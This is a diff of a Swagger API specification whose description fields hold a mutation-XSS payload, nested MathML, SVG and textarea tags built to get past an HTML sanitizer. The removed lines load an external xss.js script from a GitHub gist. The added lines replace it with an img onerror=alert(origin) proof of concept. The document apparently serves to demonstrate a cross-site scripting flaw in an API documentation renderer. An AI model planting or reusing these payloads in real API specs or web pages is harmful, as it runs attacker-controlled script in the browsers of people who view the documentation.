@@ -2,10 +2,10 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><script src='https://gist.githubusercontent.com/lucy9x/089d154b0daba34d13dc4eac048076e7/raw/ffea7a543a9531edb82149dec7a742963d31b3b2/xss.js'></script>">
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(origin)>">
 
   version: production
-basePath: /JSSResource/
+basePath: /
 produces:
   - application/xml
   - application/json
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><script src='https://gist.githubusercontent.com/lucy9x/089d154b0daba34d13dc4eac048076e7/raw/ffea7a543a9531edb82149dec7a742963d31b3b2/xss.js'></script>">
+            <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(origin)>">
 
           format: int64
           in: path
